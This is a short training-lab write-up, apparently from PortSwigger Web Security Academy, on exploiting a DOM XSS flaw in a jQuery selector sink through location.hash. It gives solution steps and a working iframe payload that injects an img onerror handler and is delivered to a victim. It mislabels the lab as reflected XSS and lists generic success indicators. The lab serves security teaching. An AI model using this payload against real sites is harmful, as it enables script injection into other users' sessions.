## DOM XSS in jQuery selector sink using a hashchange event

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's$()selector function to auto-scroll to a given post, whose title is passed via thelocation.hashproperty.

### Solution Steps
1. Notice the vulnerable code on the home page using Burp or the browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the Body section, add the following malicious iframe : <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
4. Store the exploit, then click View exploit to confirm that the print() function is called.
5. Go back to the exploit server and click Deliver to victim to solve the lab.

### Key Payloads
- `location.hash`
- `print()`
- `iframe`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
